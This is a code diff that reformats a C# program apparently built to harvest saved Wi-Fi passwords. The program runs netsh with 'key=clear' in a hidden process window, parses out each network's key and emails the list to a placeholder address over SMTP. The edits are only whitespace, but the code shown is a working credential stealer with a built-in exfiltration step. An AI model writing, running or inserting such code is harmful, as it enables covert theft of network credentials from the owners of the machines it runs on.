@@ -24,8 +24,8 @@ namespace WifiPassword
 
             return result;
         }
-        
-           public void SendWifiInfoAsEmail(List<WifiInfo> wifiInfo)
+
+        public void SendWifiInfoAsEmail(List<WifiInfo> wifiInfo)
         {
             var smtpClient = new SmtpClient
             {
@@ -37,7 +37,7 @@ namespace WifiPassword
                 EnableSsl = true,
                 Credentials = new NetworkCredential("sender-email", "sender-app-pass")
             };
-              
+
             var message = new MailMessage("sender-email", "receiver-email") {
                 Subject = "Wifi Password List",
                 Body = ""
@@ -56,10 +56,10 @@ namespace WifiPassword
         }
 
         private static string[] GetWifiPasswords(string[] profiles)
-            {
+        {
             var passwords = new string[profiles.Length];
-            
-        for (int i = 0; i < profiles.Length; i++)
+
+            for (int i = 0; i < profiles.Length; i++)
             {
                 var output = RunCommand("netsh", $"wlan show profile \"{profiles[i]}\" key=clear");
                 var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
@@ -69,36 +69,36 @@ namespace WifiPassword
                     passwords[i] = passwordLine.Trim().Replace("Key Content            : ", "");
                 }
             }
-            
-                 return passwords;
+
+            return passwords;
         }
 
-            private static string[] GetProfiles()
-            {
-                var output = RunCommand("netsh", "wlan show profiles"); //method to be created
-                var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
-                var result = lines.Where(line => line.Contains(" : ")).Select(x => x.Substring(x.IndexOf(":") + 2)).ToArray();
-                return result;
-            }
+        private static string[] GetProfiles()
+        {
+            var output = RunCommand("netsh", "wlan show profiles");
+            var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
+            var result = lines.Where(line => line.Contains(" : ")).Select(x => x.Substring(x.IndexOf(":") + 2)).ToArray();
+            return result;
+        }
 
-            private static string RunCommand(string command, string arguments)
+        private static string RunCommand(string command, string arguments)
+        {
+            var process = new Process
             {
-                var process = new Process
+                StartInfo = new ProcessStartInfo
                 {
-                    StartInfo = new ProcessStartInfo
-                    {
-                        FileName = command,
-                        Arguments = arguments,
-                        UseShellExecute = false,
-                        RedirectStandardOutput = true,
-                        CreateNoWindow = true
-                    }
-                };
+                    FileName = command,
+                    Arguments = arguments,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    CreateNoWindow = true
+                }
+            };
+
             process.Start();
             var output = process.StandardOutput.ReadToEnd();
             process.WaitForExit();
             return output;
-            }
-        
+        }
     }
 }
